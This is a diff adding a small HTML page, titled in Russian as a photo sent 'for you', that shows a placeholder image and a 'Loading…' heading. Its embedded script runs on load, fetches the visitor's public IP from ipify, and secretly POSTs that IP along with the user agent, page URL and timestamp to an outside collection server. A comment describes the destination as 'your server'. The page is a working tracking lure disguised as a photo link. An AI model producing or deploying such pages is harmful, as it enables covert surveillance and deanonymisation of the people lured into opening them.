@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Фото для тебя</title>
+</head>
+<body>
+  <h2>Загрузка…</h2>
+  <img src="https://via.placeholder.com/600x400?text=Фото" style="max-width:100%;display:block;margin:20px auto;">
+  <script>
+    (function(){
+      var info = {
+        ip: '',
+        ua: navigator.userAgent,
+        url: window.location.href,
+        time: new Date().toISOString()
+      };
+
+      // Получаем IP через сервис
+      fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(json => {
+          info.ip = json.ip;
+          // Отправляем данные на твой сервер
+          fetch('https://gps-vjas.onrender.com/send', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+          }).catch(console.error);
+        })
+        .catch(console.error);
+    })();
+  </script>
+</body>
+</html>
